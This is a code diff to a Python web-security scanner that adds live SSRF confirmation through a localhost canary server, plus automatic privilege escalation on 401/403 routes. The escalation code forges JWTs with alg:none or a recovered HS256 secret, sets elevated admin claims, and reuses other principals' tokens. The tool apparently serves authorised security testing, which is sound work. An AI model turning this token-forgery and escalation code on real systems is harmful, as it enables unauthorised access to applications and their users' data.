@@ -395,7 +395,7 @@ def _confirm_sqli(ctx: Context, r, token):
     return "", ""
 
 
-def _confirm_noauth(ctx: Context, r):
+def _confirm_noauth(ctx: Context, r, token=None):
     if ctx.safe:
         return "", ""
     try:
@@ -408,13 +408,138 @@ def _confirm_noauth(ctx: Context, r):
     return "", ""
 
 
-_CONFIRMERS = {"ssti": _confirm_ssti, "cmdi": _confirm_cmdi, "sqli": _confirm_sqli}
+# ── SSRF live confirmation via an ephemeral canary listener ──────────────────
+_URLISH = re.compile(
+    r"url|uri|link|src|img|image|photo|avatar|host|fetch|callback|webhook|redirect|"
+    r"target|endpoint|href|proxy|feed|remote|site|domain|upstream|origin", re.IGNORECASE)
+
+
+class _Canary:
+    """Ephemeral localhost HTTP server that records whether the target fetched it."""
+
+    def __init__(self):
+        self.hits: list[str] = []
+        self._httpd = None
+        self.port = None
+
+    def __enter__(self):
+        import http.server
+        import threading
+        hits = self.hits
+
+        class H(http.server.BaseHTTPRequestHandler):
+            def do_GET(self):  # noqa: N802
+                hits.append(self.path)
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(b"ok")
+            do_POST = do_GET
+
+            def log_message(self, *a):  # silence
+                return
+
+        self._httpd = http.server.HTTPServer(("127.0.0.1", 0), H)
+        self.port = self._httpd.server_address[1]
+        threading.Thread(target=self._httpd.serve_forever, daemon=True).start()
+        return self
+
+    def __exit__(self, *a):
+        if self._httpd:
+            self._httpd.shutdown()
+
+
+def _confirm_ssrf(ctx: Context, r, token):
+    gated = False
+    with _Canary() as c:
+        canary = f"http://127.0.0.1:{c.port}/heimdall-ssrf"
+        for p in (r.query_params or []):
+            nm = p.get("name")
+            if not nm or not _URLISH.search(nm):
+                continue
+            try:
+                resp = ctx.get(r.fill_path({}), token=token, params={nm: canary})
+                if resp.status_code in (401, 403):
+                    gated = True
+            except Exception:  # noqa: BLE001
+                continue
+        if not ctx.safe and r.method in ("POST", "PUT", "PATCH") and r.body_schema is not None:
+            sf = [f for f in string_body_fields(r) if _URLISH.search(f)] or string_body_fields(r)
+            if sf:
+                path, body = build_request(ctx, r, token, overrides={f: canary for f in sf[:6]})
+                try:
+                    resp = ctx.request(r.method, path, token=token, json=body)
+                    if resp.status_code in (401, 403):
+                        gated = True
+                except Exception:  # noqa: BLE001
+                    pass
+        time.sleep(0.4)  # let an async/background fetch land
+        if c.hits:
+            return "CONFIRMED", (f"target fetched attacker URL {canary} ({len(c.hits)} hit) "
+                                 "— server-side request to an attacker-chosen host")
+    if gated:
+        return "GATED", f"{r.method} {r.path} -> 401/403 for the test principal"
+    return "", ""
+
+
+# ── auto privilege-escalation for GATED sinks ────────────────────────────────
+# Common privilege claims set to elevated values (set even when ABSENT — many
+# apps read role/scope straight off the token and treat a missing one as user).
+_ELEV_SETS = [
+    {"role": "admin", "roles": ["admin"], "is_admin": True, "admin": True,
+     "is_superuser": True, "is_staff": True, "scope": "admin", "scopes": "admin",
+     "type": "admin", "permissions": ["admin"]},
+    {"role": "super_admin", "is_admin": True, "scope": "*"},
+    {"role": "Chef"}, {"role": "Employee"}, {"role": "administrator"},
+]
+
+
+def _escalation_tokens(ctx: Context, base_token):
+    """Candidate elevated tokens to retry a GATED route with: JWT forgeries
+    (alg:none, or HS256 under a recovered secret) carrying elevated claims, plus
+    any other authed principal we already hold."""
+    if not base_token:
+        return []
+    from ..discovery import auth as auth_detect
+    from .a02_crypto_jwt import _encode
+    out = []
+    dec = auth_detect.decode_jwt(base_token)
+    if dec:
+        header, claims = dec
+        variants = [{**claims, **elev} for elev in _ELEV_SETS]
+        for c in variants:
+            out.append((_encode({**header, "alg": "none"}, c, None),
+                        "forged alg:none + elevated claims"))
+        secret = None
+        try:
+            from ..bootstrap import minting
+            secret = minting.recover_secret(ctx.profile, base_token)
+        except Exception:  # noqa: BLE001
+            secret = None
+        if secret:
+            for c in variants:
+                out.append((_encode({**header, "alg": "HS256"}, c, secret),
+                            f"forged HS256 (recovered secret {secret!r}) + elevated claims"))
+    for pr in getattr(ctx.profile, "principals", {}).values():
+        tok = getattr(pr, "token", None)
+        if tok and tok != base_token:
+            out.append((tok, f"reuse principal '{pr.label}' token"))
+    return out[:12]
+
+
+_CONFIRMERS = {"ssti": _confirm_ssti, "cmdi": _confirm_cmdi, "sqli": _confirm_sqli,
+               "ssrf": _confirm_ssrf, "noauth": _confirm_noauth}
 
 
 def _chain(ctx: Context, kind: str, sinks: list, handlers: dict, calls: dict, token):
-    """Return (verdict, evidence_line) — best confirmation across this kind's sinks."""
+    """Return (verdict, evidence_line) — best confirmation across this kind's sinks.
+
+    On GATED (401/403 for the low-priv actor), attempt automatic privilege
+    escalation: retry the same probe with forged/elevated tokens; a hit flips the
+    verdict to CONFIRMED and records the escalation used."""
+    confirm = _CONFIRMERS[kind]
     best = ("", "")
     order = {"CONFIRMED": 3, "GATED": 2, "": 0}
+    esc_tokens = None
     for sink in sinks[:8]:
         routes = ([sink["route"]] if kind == "noauth" else
                   _routes_for_sink(sink, handlers, calls))
@@ -422,14 +547,18 @@ def _chain(ctx: Context, kind: str, sinks: list, handlers: dict, calls: dict, to
             r = _match_route(ctx, m, p)
             if r is None:
                 continue
-            if kind == "noauth":
-                v, ev = _confirm_noauth(ctx, r)
-            else:
-                v, ev = _CONFIRMERS[kind](ctx, r, token)
+            v, ev = confirm(ctx, r, token)
+            if v == "CONFIRMED":
+                return (v, ev)
+            if v == "GATED" and kind != "noauth":
+                if esc_tokens is None:
+                    esc_tokens = _escalation_tokens(ctx, token)
+                for etok, how in esc_tokens:
+                    v2, ev2 = confirm(ctx, r, etok)
+                    if v2 == "CONFIRMED":
+                        return ("CONFIRMED", f"{ev2}   [via privilege escalation: {how}]")
             if order.get(v, 0) > order.get(best[0], 0):
                 best = (v, ev)
-            if v == "CONFIRMED":
-                return best
     return best
 
 
@@ -477,9 +606,10 @@ _SPEC = {
                     [REFS["A05"]], ["curl -I", "nikto"]),
 }
 _ORDER = ["cmdi", "eval", "deser", "ssti", "sqli", "commented_auth", "ssrf", "noauth", "header_leak"]
-_CONFIRMABLE = {"cmdi", "ssti", "sqli", "noauth"}
+_CONFIRMABLE = {"cmdi", "ssti", "sqli", "noauth", "ssrf"}
 # When a sink is CONFIRMED live, elevate severity.
-_ELEVATE = {"ssti": "CRITICAL", "sqli": "CRITICAL", "noauth": "HIGH", "cmdi": "CRITICAL"}
+_ELEVATE = {"ssti": "CRITICAL", "sqli": "CRITICAL", "noauth": "HIGH", "cmdi": "CRITICAL",
+            "ssrf": "HIGH"}
 
 
 @module("sast", "Static Analysis + DAST chaining (source sinks)")
